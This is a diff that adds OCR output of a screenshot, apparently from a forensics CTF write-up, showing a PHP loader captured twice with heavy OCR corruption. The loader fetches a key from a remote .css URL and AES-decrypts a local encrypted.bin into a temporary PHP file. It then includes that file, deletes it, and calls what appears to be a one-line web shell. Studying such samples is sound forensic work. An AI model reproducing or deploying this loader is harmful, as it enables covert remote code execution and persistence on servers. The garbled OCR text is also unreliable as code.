@@ -1,0 +1,18 @@
+# OCR: f3dd0ed1d95c61a42b624142fe582622.webp
+# 来源: .\02-WriteUp\2025\f3dd0ed1d95c61a42b624142fe582622.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:40
+
+回 编 罗 小 助 手 URL 矫 B X …‖
+$a=file_get_contents(‘https://foren6 .atwebpages.com/woyao/eat/%E7%81%AB%E9%94%85/%EB%9C%B2%EB%9
+C%9C%E9%94%85%E5%BA%95.css');Sb=md5(Sa,true);Sc=file_get_contents(’./../.././encrypted.bin’);$d=base64_d
+ecode($c);$e='aes-256-
+cbc';$f=openss|_cipher_iv_length($e);$g=substr($d,0,$f);Sh=substr($d,$f);Si=openss|_decrypt($h,$e,$b,OPENSSL_
+RAW_DATA,Sg);$j=sys_get_temp_dir();Sk=$}.’/func_'.uniqid().".php';file_put_contents($k,"<?php\n".$i);include
+$k:unlink($k);yijuhua();
+$a=file_get_contents('https://foren6.atwebpages.com/woyao/eat/X$8/2¢ SRR. css')$b=md5
+(Sa,true);$ 3 =base64_decode($c);$e
+绽 桂 ¢':$f=openssl_cipher_iv length($e);$g=substr($d,0,$f);$h=substr(Sd,$f);
+(Sh,$e,Sb,OPENSSL_RAW_DATA,Sg);Sj=sys_ get temp_dir();$k=$).'/func_‘.unigid(.'.php’yfile_ put_
+contents($k," <?php\n’.Si);include $k;unlink(Sk);yijuhuaQ;
+att 口
